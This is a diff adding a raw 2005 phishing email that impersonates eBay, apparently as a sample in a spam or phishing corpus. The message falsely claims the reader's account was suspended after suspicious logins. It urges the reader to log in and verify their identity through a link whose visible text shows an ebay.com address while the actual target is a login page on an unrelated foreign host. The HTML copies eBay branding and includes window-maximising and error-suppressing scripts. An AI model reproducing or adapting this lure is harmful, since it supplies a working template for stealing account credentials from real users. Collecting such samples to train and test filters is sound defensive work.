@@ -1,0 +1,218 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id DE0A42A88C
+ for <user@example.com>; Sun, 24 Jul 2005 02:36:45 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id DCD3A621C99; Sun, 24 Jul 2005 02:36:45 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id BAB51621C95
+ for <user@example.com>; Sun, 24 Jul 2005 02:36:45 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id CAA20869
+ for user@example.com; Sun, 24 Jul 2005 02:36:45 -0400
+Received: from smtpserver.visit.se (smtpserver.visit.se [212.214.126.25])
+ by mail.example.com with ESMTP id CAA20861
+ for <user@example.com>; Sun, 24 Jul 2005 02:36:44 -0400
+Received: from mail.stunet.se (mail.stunet.se [85.194.0.111])
+ by smtpserver.visit.se (Postfix) with ESMTP id 16C5D11404AD
+ for <user@example.com>; Sun, 24 Jul 2005 08:35:57 +0200 (CEST)
+Received: from pool.lime.ms (cust.fiber-lan.vnet.lk.85.194.51.168.stunet.se
+ [85.194.51.168]) by mail.stunet.se (Postfix) with ESMTP id 9097E2A503
+ for <user@example.com>; Sun, 24 Jul 2005 08:35:56 +0200 (CEST)
+Received: from eggis.homeip.net
+ (c-7ec570d5.016-48-6f72652.cust.bredbandsbolaget.se [213.112.197.126])
+ by pool.lime.ms (Postfix) with ESMTP id 0B96A51198
+ for <user@example.com>; Sun, 24 Jul 2005 08:35:55 +0200 (CEST)
+Received: by eggis.homeip.net (Postfix, from userid 1011)
+ id E892147EDF; Sun, 24 Jul 2005 08:35:54 +0200 (CEST)
+To: user@example.com
+Subject: Your eBay Account Has Been Suspended !!!
+From: "service@eBay.com" <service@eBay.com>
+Content-Type: text/html
+Message-Id: <20050724063554.E892147EDF@eggis.homeip.net>
+Date: Sun, 24 Jul 2005 08:35:54 +0200 (CEST)
+Content-Length: 6258
+Lines: 176
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 52
+
+
+<HTML><HEAD><TITLE>eBay - verify your account information</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<SCRIPT language=JavaScript1.2>
+<!--
+
+/*
+Auto Maximize Window Script- By Nick Lowe (nicklowe@ukonline.co.uk)
+For full source code, 100's more free DHTML scripts, and Terms Of Use
+Visit http://www.dynamicdrive.com
+*/
+
+top.window.moveTo(0,0);
+if (document.all) {
+top.window.resizeTo(screen.availWidth,screen.availHeight);
+}
+else if (document.layers||document.getElementById) {
+if (top.window.outerHeight<screen.availHeight||top.window.outerWidth<screen.availWidth){
+top.window.outerHeight = screen.availHeight;
+top.window.outerWidth = screen.availWidth;
+}
+}
+//-->
+</SCRIPT>
+
+<SCRIPT language=JavaScript>
+<!--
+var ssl_copartnerid ="2"
+//  -->
+</SCRIPT>
+
+<SCRIPT language=JavaScript>
+<!-- Hide me from lame browsers
+
+function CC_noErrors() {
+return true;
+}
+
+window.onerror = CC_noErrors;
+
+// -->
+</SCRIPT>
+
+<SCRIPT language=javascript src="" type=text/javascript>
+</SCRIPT>
+
+<SCRIPT language=JavaScript>
+<!--
+var pageName = "PageValidateNewSellerShow";
+var server = "location.hostname.toLowerCase()";
+var channel = "eBay";
+//-->
+</SCRIPT>
+
+<SCRIPT language=Javascript>
+<!--
+function popWindow(u,n,o,x,y)
+{
+	var s = o+',width='+x+',height='+y
+	window.open(u,n,s)}
+//-->
+</SCRIPT>
+
+<SCRIPT language=JavaScript 
+src="ebay/openHelpWindow.js"></SCRIPT>
+<!-- header --><!-- test header revamp 5/20--><!-- 0+0 -->
+<SCRIPT 
+src="ebay/openHelpWindow.js"></SCRIPT>
+
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY bgColor=#ffffff>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+    <TR> 
+      <TD width=150> <SCRIPT language=JavaScript>
+	<!--
+	var cbc;
+	if (cbc){
+		writeBrow();
+	}
+	//  -->
+	  </SCRIPT>
+        <A href="http://www.ebay.com/"> <IMG height=78 alt="eBay logo" hspace=0 
+      src="http://pics.ebay.com/aw/pics/homepage/v2/logo_171x102.gif" width=171 border=0></A> 
+      </TD>
+      <TD vAlign=top align=right width=450><MAP 
+        name=home_myebay_map_hasJS>
+          <AREA shape=RECT alt=Home coords=209,0,256,15 
+        href="http://pages.ebay.com/index.html">
+          <AREA shape=RECT alt="My eBay" 
+        coords=257,0,318,15 
+        href="http://cgi1.ebay.com/aw-cgi/eBayISAPI.dll?MyEbayLogin">
+          <AREA 
+        shape=RECT alt="Site Map" coords=319,0,383,15 
+        href="http://pages.ebay.com/sitemap.html">
+          <AREA shape=RECT 
+        alt="Sign In/Out" coords=384,0,447,15 
+        href="http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?SignIn">
+        </MAP>
+        <MAP 
+      name=home_myebay_map_noJS>
+          <AREA shape=RECT alt=Home coords=198,0,245,15 
+        href="http://pages.ebay.com/index.html">
+          <AREA shape=RECT alt="My eBay" 
+        coords=246,0,307,15 
+        href="http://cgi1.ebay.com/aw-cgi/eBayISAPI.dll?MyEbayLogin">
+          <AREA 
+        shape=RECT alt="Site Map" coords=308,0,372,15 
+        href="http://pages.ebay.com/sitemap.html">
+          <AREA shape=RECT 
+        alt="Sign In/Out" coords=373,0,447,15 
+        href="http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?SignIn">
+        </MAP>
+        <NOSCRIPT>
+        </NOSCRIPT> </TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<P align="left"> Dear <strong>eBay</strong> Member,</P>
+<P align="left"><br>
+  <strong> We recenlty noticed one or more attempts to login into your eBay account
+      from a unknow IP address and we have reasons to belive that your account has been 
+  used bya thirth party. In order to protect your Sensitive information or unauthorized listing
+         wetemporarily suspended your account for further investigations.</strong>
+<P align="left"><a href="http://www.visual.ppg.br/imagens/.cgi/.ebay/.ebay/.eBay231/.ebay/.eBay/eBayACCOUNT/LOGINAccounteBay/eBaySECURITY/login.html">https://www.ebay.com/acounts/memb/avncenter/?dll87443%2213</a><br>
+  <br>
+</P>
+<P><strong>According to our site policy you will have to confirm that you are 
+    the real owner of theeBay account by log in end verify your identity or else you 
+        account will remain suspendedwithout the rightto register againwith eBay</strong>.<BR>
+  <P>&nbsp;</P>
+<P> Thank you ,<br>
+  <strong>eBay <FONT size=2>&copy;</FONT></strong> Accounts Managent </P>
+<P align="left">&nbsp;</P>
+<p align="left">As outlined in our User Agreement, <strong>eBay</strong> will periodically send 
+  you information about site changes and enhancements. Visit our Privacy Policy 
+  and User 
+  Agreement if you have any questions. </p>
+<p align="left">
+  <SCRIPT 
+src="ebay/ss-secure.js"></SCRIPT>
+</p>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+  <TR>
+    <TD colSpan=2><BR>
+        <P><BR></P>
+        <DIV align=center><FONT size=2><A 
+      href="http://www2.ebay.com/aw/marketing.shtml">Announcements</A>&nbsp;&nbsp;|&nbsp;&nbsp;<A 
+      href="http://cgi4.ebay.com/aw-cgi/eBayISAPI.dll?RegisterShow">Register</A> 
+          |&nbsp;&nbsp;&nbsp;<A 
+      href="http://pages.ebay.com/services/forum/feedback.html">Feedback 
+          For</A></FONT><FONT size=2><A 
+      href="http://r.aol.com%5Ccgi%5Credir-complex?url=http://pages.ebay.com/services/forum/feedback.html">um</A>&nbsp;&nbsp;|&nbsp;&nbsp;<A 
+      href="http://pages.ebay.com/community/aboutebay/index.html">About 
+          eBay</A></FONT></DIV>  
+        <hr align=center width=500>
+        <font size=2>&nbsp;</font>        <P><BR>
+        </P></TD></TR>
+  <TR>
+    <TD vAlign=top align=left width=450 height=31><FONT size=2>Copyright © 
+      1995-2005 <strong>eBay</strong> Inc. All Rights Reserved. <BR>
+      Designated trademarks and 
+      brands are the property of their respective owners. <BR>
+        Use of this Web site constitutes acceptance of the <strong>eBay</strong> <A 
+      href="http://pages.ebay.com/help/community/png-user.html">User 
+        Agreement</A> and <A 
+      href="http://pages.ebay.com/help/community/png-priv.html">Privacy 
+      Policy</A>. </FONT><BR></TD>
+      <TD vAlign=top align=right width=150 height=31><FONT size=2><a 
+      href="ebay/png-priv.html"><img height=31 
+      alt=TrustE 
+      src="https://securepics.ebaystatic.com/aw/pics/truste_button.gif" 
+      width=116 align=middle border=0></a> </FONT></TD>
+    </TR></TBODY></TABLE>
+</BODY></HTML>
